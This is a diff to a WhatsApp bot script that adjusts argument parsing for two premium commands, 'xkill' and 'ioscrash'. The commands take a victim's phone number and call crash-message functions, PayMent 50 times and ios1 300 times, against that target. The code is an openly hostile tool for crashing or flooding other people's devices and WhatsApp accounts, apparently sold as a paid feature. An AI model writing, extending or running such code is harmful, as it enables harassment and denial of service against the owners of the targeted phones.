@@ -868,8 +868,8 @@ async function ios1(jid) {
 
 case 'xkill': {
 if (!isPremium) return replygcxeon(mess.prem)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} 91xxxxxxxxxx\nExample ${prefix+command} 916909137269`)
-let target = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net"
+if (!q) return replygcxeon(`Use ${prefix+command} 91xxxxxxxxxx\nExample ${prefix+command} 916909137269`)
+let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
 await loading()
 for (let i = 0; i < 50; i++) {
 await PayMent(target)
@@ -909,8 +909,8 @@ break
 			
 case 'ioscrash': {
 if (!isPremium) return replygcxeon(mess.premium)
-if (!args[0]) return replygcxeon(`Use like:\n ${prefix + command} 23490316165xx`)
-let target = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net"
+if (!q) return replygcxeon(`Use like:\n ${prefix + command} 23490316165xx`)
+let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
 await loading()
 for (let i = 0; i < 300; i++) {
  await ios1(target)
